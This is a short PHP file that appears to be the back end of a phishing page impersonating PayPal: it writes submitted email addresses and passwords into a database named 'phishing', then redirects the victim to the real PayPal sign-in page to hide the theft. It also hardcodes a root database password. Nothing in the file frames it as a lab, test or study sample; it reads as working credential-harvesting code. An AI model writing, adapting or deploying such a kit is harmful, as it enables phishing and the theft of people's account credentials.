<?php
// Database connection information
$servername = "127.0.0.1";
$username = "root";
$password = "Phantom123@";
$dbname = "phishing";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve user input
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Check if email and password are provided
    if (empty($email) || empty($password)) {
        die("Email and password are required.");
    }

    // Prepare and execute SQL statements safely
    try {
        // Prepare statement for selecting user
        $select_stmt = $conn->prepare("SELECT password FROM credentials WHERE email = ?");
        $select_stmt->bind_param("s", $email);
        $select_stmt->execute();
        $select_stmt->store_result();

        // Check if user exists
        if ($select_stmt->num_rows > 0) {
            // Fetch user data
            $select_stmt->bind_result($hashed_password);
            $select_stmt->fetch();

            // Verify the password
            if (password_verify($password, $hashed_password)) {
                echo "Login successful!";
            } else {
                echo "Login failed.";
            }
        } else {
            // If user doesn't exist, insert new credentials
            $obfuscated_password = password_hash($password, PASSWORD_DEFAULT);
            $insert_stmt = $conn->prepare("INSERT INTO credentials (email, password) VALUES (?, ?)");
            $insert_stmt->bind_param("ss", $email, $obfuscated_password);
            $insert_stmt->execute();
            $insert_stmt->close();

            echo "New credentials stored.";
        }
   // Close the select statement
        $select_stmt->close();
    } catch (mysqli_sql_exception $e) {
        echo "Error: " . $e->getMessage();
    }
} else {
    echo "Invalid request method.";
}

$conn->close();
?>

<script>
    // Redirect to the real PayPal site
    window.onload = function() {
        window.location.replace("https://www.paypal.com/signin");
    };
</script>
